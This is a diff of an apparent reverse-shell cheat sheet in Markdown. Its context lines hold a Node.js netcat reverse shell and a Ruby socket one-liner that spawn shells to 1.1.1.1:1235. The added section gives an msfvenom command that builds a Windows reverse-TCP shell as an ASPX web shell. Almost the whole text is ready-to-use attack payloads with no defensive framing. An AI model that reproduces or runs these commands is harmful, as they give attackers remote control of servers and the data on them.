@@ -92,3 +92,9 @@ require('child_process').exec('nc -e /bin/bash 1.1.1.1 1235')
 ```bash
 ruby -rsocket -e'f=TCPSocket.open("1.1.1.1",1235).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ```
+
+## msfvenom
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp lhost=1.1.1.1 lport=1235 -f aspx > shell.aspx
+```
